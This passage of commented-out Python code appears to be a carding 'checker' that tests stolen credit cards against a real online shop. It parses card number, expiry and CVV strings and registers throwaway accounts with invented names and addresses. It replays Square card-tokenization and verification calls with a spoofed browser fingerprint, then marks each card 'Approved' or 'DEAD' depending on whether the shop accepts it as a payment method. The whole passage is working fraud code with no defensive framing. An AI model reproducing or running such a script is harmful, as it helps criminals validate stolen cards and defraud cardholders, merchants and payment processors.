#             "website_url": "www.dd8shop.com",
#             "analytics_token": analytics_token,
#             "card_data": {
#                 "billing_postal_code": rand_user["zip"],
#                 "cvv": cvv,
#                 "exp_month": int(mesnew),
#                 "exp_year": int(ano),
#                 "number": cc
#             }
#         }

#         token_res = session.post(url=url_4,json=data_4)
#         print(token_res.text)

#         if "card_brand" in token_res.text:
#             card_nonce = token_res.json()["card_nonce"]
#             card_brand = token_res.json()["card"]["card_brand"]
#             last_4 = token_res.json()["card"]["last_4"]
#         else:
#             response = "Error While Creating the payment Method !"


#         url_6 = "https://connect.squareup.com/v2/analytics/verifications"

#         data_6 = {
#             "browser_fingerprint_by_version": [
#                 {
#                     "payload_json": "{\"components\":{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"ecf627cd8814a922bb0f6770f1ec1579\"}",
#                     "payload_type": "fingerprint-v1"
#                 },
#                 {
#                     "payload_json": "{\"components\":{\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"f39d2f00ff0809ced69852f7a51fe749\"}",
#                     "payload_type": "fingerprint-v1-sans-ua"
#                 }
#             ],
#             "browser_profile": {
#                 "components": "{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]}",
#                 "fingerprint": "ecf627cd8814a922bb0f6770f1ec1579",
#                 "timezone": "-330",
#                 "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
#                 "version": "ab516279fb80f0bfbaf0965f9b301de3c05db9dd",
#                 "website_url": "https://www.dd8shop.com/"
#             },
#             "client_id": "sq0idp-wGVapF8sNt9PLrdj5znuKA",
#             "payment_source": card_nonce,
#             "universal_token": {
#                 "token": "L09TDVVXNJ733",
#                 "type": "UNIT"
#             },
#             "verification_details": {
#                 "billing_contact": {
#                     "address_lines": ["123 5th Ave", ""],
#                     "city": rand_user["city"],
#                     "country": "US",
#                     "email": email,
#                     "family_name": rand_user["last_name"],
#                     "given_name": rand_user["first_name"],
#                     "phone": rand_user["phone"],
#                     "postal_code": rand_user["phone"],
#                     "region": rand_user["state"]
#                 },
#                 "intent": "STORE"
#             }
#         }

#         res_6 = session.post(url=url_6,json=data_6)

#         if '"status":"COMPLETED"' in res_6.text:
#             token_veri = res_6.json()["token"]

#         else:
#             response = "ERROR! WHILE CREATING VERFICATION TOKEN"

#         last_url = "https://www.dd8shop.com/my-account/add-payment-method/"

#         last_data = {
#             "payment_method": "square_credit_card",
#             "wc-square-credit-card-card-type": card_brand,
#             "wc-square-credit-card-last-four": last_4,
#             "wc-square-credit-card-exp-month": int(mesnew),
#             "wc-square-credit-card-exp-year": int(ano),
#             "wc-square-credit-card-payment-nonce": card_nonce,
#             "wc-square-credit-card-payment-postcode": rand_user["zip"],
#             "wc-square-credit-card-buyer-verification-token": token_veri,
#             "wc-square-credit-card-tokenize-payment-method": "true",
#             "woocommerce-add-payment-method-nonce": add_nonce,
#             "_wp_http_referer": "/my-account/add-payment-method/",
#             "woocommerce_add_payment_method": "1"
#         }

#         last_res = session.post(url=last_url,data=last_data,headers=header1)

#         if "New payment method added" in last_res.text or "Nice! New payment method added" in last_res.text:
#             status = "Approved ✅"
#             response = "New Payment Method Added"

#         else:
#             status = "DEAD 🔴"
#             response = "Decline By Issuer"
        
#         resp = response

#         print(resp)

      
#         return resp,status

#     except Exception as e:
#         print(e)


# def multiexplode(string):
#     lista = str(string)
#     if '|' in lista:
#         final = lista.split('|')
#         return final
#     elif ':' in lista:
#         final = lista.split(':')
#         return final

# async def find_between(data, first, last):
#     try:
#         start = data.index(first) + len(first)
#         end = data.index(last, start)
#         return data[start:end]
#     except ValueError:
#         return None

# async def charge(session,fullz):
#     try:
#         lista = fullz
#         cc = multiexplode(lista)[0]
#         mes = multiexplode(lista)[1]
#         ano = multiexplode(lista)[2]
#         cvv = multiexplode(lista)[3]
#         if mes[0:1] == '1':
#             mesnew = mes
#         else:
#             mesnew = mes[1:2]
#         if len(ano) == 2:
#             ano = "20" + ano
        
#         rand_user = rand_user().rand_user()

#         header1 = {
#             'Origin': 'https://www.dd8shop.com',
#             'Referer': 'https://www.dd8shop.com/my-account/add-payment-method/',
#             'Sec-Ch-Ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
#             'Sec-Ch-Ua-Mobile': '?0',
#             'Sec-Ch-Ua-Platform': '"Windows"',
#             'Sec-Fetch-Dest': 'document',
#             'Sec-Fetch-Mode': 'navigate',
#             'Sec-Fetch-Site': 'same-origin',
#             'Sec-Fetch-User': '?1',
#             'Upgrade-Insecure-Requests': '1',
#             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
#         }
#         res_1 = await session.get(url="https://www.dd8shop.com/my-account/add-payment-method/",headers=header1)

#         rigester_none = await find_between(res_1.text, 'name="woocommerce-register-nonce" value="', '"')

#         #-------------------------------------------#
#         email = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000,9999999)}@gmail.com"

#         data_2 = {
#             "email": email,
#             "password": "123@Password8494",
#             "woocommerce-register-nonce": rigester_none,
#             "_wp_http_referer": "/my-account/add-payment-method/",
#             "register": "Register"
#         }
#         res_2 =  await session.post(url="https://www.dd8shop.com/my-account/add-payment-method/", data=data_2,headers=header1)
#         print(f"res_2 = {res_2.status_code}\n{res_2.headers}")


#         #------------------------------------------------#


#         res_3 = await session.get(url="https://www.dd8shop.com/my-account/edit-address/billing/",headers=header1)


#         address_nonce = await find_between(res_3.text, 'name="woocommerce-edit-address-nonce" value="', '"')

#         #-----------------------------------------------#


#         #-------------FIll Address------------------#

#         header3 = {
#             'Origin': 'https://www.dd8shop.com',
#             'Referer': 'https://www.dd8shop.com/my-account/edit-address/billing/',
#             'Sec-Ch-Ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
#             'Sec-Ch-Ua-Mobile': '?0',
#             'Sec-Ch-Ua-Platform': '"Windows"',
#             'Sec-Fetch-Dest': 'document',
#             'Sec-Fetch-Mode': 'navigate',
#             'Sec-Fetch-Site': 'same-origin',
#             'Sec-Fetch-User': '?1',
#             'Upgrade-Insecure-Requests': '1',
#             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
#         }

#         data_3 = {
#             "billing_first_name": rand_user["first_name"],
#             "billing_last_name": rand_user["last_name"],
#             "billing_country": "US",
#             "billing_address_1": rand_user["street"],
#             "billing_city": rand_user["city"],
#             "billing_state": rand_user["state"],
#             "billing_postcode": rand_user["zip"],
#             "billing_phone": "8765454345",
#             "billing_email": email,
#             "save_address": "Save address",
#             "woocommerce-edit-address-nonce": address_nonce,
#             "_wp_http_referer": "/my-account/edit-address/billing/",
#             "action": "edit_address"
#         }

#         res_4 =await session.post(url="https://www.dd8shop.com/my-account/edit-address/billing/",data=data_3,headers=header3)


#         #----------------------------------------------------------#

#         res_5 = await session.get(url="https://www.dd8shop.com/my-account/add-payment-method/",headers=header1)

#         add_nonce =await find_between(res_5.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')

#         # print(res_5.text)


#         #--------------------------------------------------------------#

#         while True:
#             res1 = await session.get("https://pci-connect.squareup.com/payments/hydrate?applicationId=sq0idp-wGVapF8sNt9PLrdj5znuKA&hostname=www.dd8shop.com&locationId=L09TDVVXNJ733&version=1.51.4")
#             try:
#                 sessionId = res1.json()["sessionId"]
#                 break
#             except:
#                 continue

#         data_1 = {"components":"{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]}","fingerprint":"ecf627cd8814a922bb0f6770f1ec1579","timezone":"-330","user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","version":"ab516279fb80f0bfbaf0965f9b301de3c05db9dd","website_url":"https://www.dd8shop.com/","client_id":"sq0idp-wGVapF8sNt9PLrdj5znuKA","browser_fingerprint_by_version":[{"payload_json":"{\"components\":{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"ecf627cd8814a922bb0f6770f1ec1579\"}","payload_type":"fingerprint-v1"},{"payload_json":"{\"components\":{\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"f39d2f00ff0809ced69852f7a51fe749\"}","payload_type":"fingerprint-v1-sans-ua"}]}

#         respon_v2 = await session.post(url="https://connect.squareup.com/v2/analytics/token", json=data_1)

#         analytics_token = respon_v2.json()["token"]


#         #_----------------------------------------#


#         url_4 = "https://pci-connect.squareup.com/v2/card-nonce?_=1694789398336.826&version=1.51.4"

#         data_4 = {
#             "client_id": "sq0idp-wGVapF8sNt9PLrdj5znuKA",
#             "location_id": "L09TDVVXNJ733",
#             "payment_method_tracking_id": "f38634cb-2a21-083f-0494-872d6c2e24e9",
#             "session_id": sessionId,
#             "website_url": "www.dd8shop.com",
#             "analytics_token": analytics_token,
#             "card_data": {
#                 "billing_postal_code": rand_user["zip"],
#                 "cvv": cvv,
#                 "exp_month": int(mesnew),
#                 "exp_year": int(ano),
#                 "number": cc
#             }
#         }

#         token_res = await session.post(url=url_4,json=data_4)
#         print(token_res.text)

#         if "card_brand" in token_res.text:
#             card_nonce = token_res.json()["card_nonce"]
#             card_brand = token_res.json()["card"]["card_brand"]
#             last_4 = token_res.json()["card"]["last_4"]
#         else:
#             response = "Error While Creating the payment Method !"


#         url_6 = "https://connect.squareup.com/v2/analytics/verifications"

#         data_6 = {
#             "browser_fingerprint_by_version": [
#                 {
#                     "payload_json": "{\"components\":{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"ecf627cd8814a922bb0f6770f1ec1579\"}",
#                     "payload_type": "fingerprint-v1"
#                 },
#                 {
#                     "payload_json": "{\"components\":{\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"f39d2f00ff0809ced69852f7a51fe749\"}",
#                     "payload_type": "fingerprint-v1-sans-ua"
#                 }
#             ],
#             "browser_profile": {
#                 "components": "{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1536,816],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf\",\"WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Console\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"MS Gothic\",\"MS PGothic\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]}",
#                 "fingerprint": "ecf627cd8814a922bb0f6770f1ec1579",
#                 "timezone": "-330",
#                 "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
#                 "version": "ab516279fb80f0bfbaf0965f9b301de3c05db9dd",
#                 "website_url": "https://www.dd8shop.com/"
#             },
#             "client_id": "sq0idp-wGVapF8sNt9PLrdj5znuKA",
#             "payment_source": card_nonce,
#             "universal_token": {
#                 "token": "L09TDVVXNJ733",
#                 "type": "UNIT"
#             },
#             "verification_details": {
#                 "billing_contact": {
#                     "address_lines": ["123 5th Ave", ""],
#                     "city": rand_user["city"],
#                     "country": "US",
#                     "email": email,
#                     "family_name": rand_user["last_name"],
#                     "given_name": rand_user["first_name"],
#                     "phone": rand_user["phone"],
#                     "postal_code": rand_user["phone"],
#                     "region": rand_user["state"]
#                 },
#                 "intent": "STORE"
#             }
#         }

#         res_6 =await session.post(url=url_6,json=data_6)

#         if '"status":"COMPLETED"' in res_6.text:
#             token_veri = res_6.json()["token"]

#         else:
#             response = "ERROR! WHILE CREATING VERFICATION TOKEN"

#         last_url = "https://www.dd8shop.com/my-account/add-payment-method/"

#         last_data = {
#             "payment_method": "square_credit_card",
#             "wc-square-credit-card-card-type": card_brand,
#             "wc-square-credit-card-last-four": last_4,
#             "wc-square-credit-card-exp-month": int(mesnew),
#             "wc-square-credit-card-exp-year": int(ano),
#             "wc-square-credit-card-payment-nonce": card_nonce,
#             "wc-square-credit-card-payment-postcode": rand_user["zip"],
#             "wc-square-credit-card-buyer-verification-token": token_veri,
#             "wc-square-credit-card-tokenize-payment-method": "true",
#             "woocommerce-add-payment-method-nonce": add_nonce,
#             "_wp_http_referer": "/my-account/add-payment-method/",
#             "woocommerce_add_payment_method": "1"
#         }

#         result = await session.post(url=last_url,data=last_data,headers=header1)
#         # if "New payment method added" in result.text or "Nice! New payment method added" in result.text:
#         #     response = "𝐀𝐔𝐓𝐇 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 🟢"
            
#         # else:
#         #     response = "DEAD 🔴"
         
#         # resp = response
#         return result.text
#     except Exception as e:
#         print(e)